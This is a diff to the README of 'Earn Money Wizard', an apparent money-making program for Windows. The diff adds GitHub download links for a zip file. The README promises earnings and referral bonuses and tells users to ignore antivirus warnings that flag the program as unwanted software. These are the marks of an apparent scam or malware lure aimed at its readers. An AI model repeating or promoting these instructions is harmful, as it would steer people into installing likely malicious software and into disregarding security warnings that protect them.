@@ -7,7 +7,7 @@ Average earning:
   - + 20 % for every reffered user. (help us find new users)
   
   Installation:
-    - 1. Download Earn_money_wizard.zip and unpack it.
+    - 1. Download Earn_money_wizard.zip and unpack it. [link](https://github.com/emwizard/emwizard/blob/master/Earn_Money_Wizard.zip)
     - 2. When running you need to wait a while to get results.
     
       -- Some cheap antiviruses may falsy assume that it is unwanted software, just ignore it for now.    
@@ -17,3 +17,6 @@ Average earning:
     - Windows
     
  more at: http://emwizard.com
+
+DOWNLOADS:
+  1. https://github.com/emwizard/emwizard/blob/master/Earn_Money_Wizard.zip
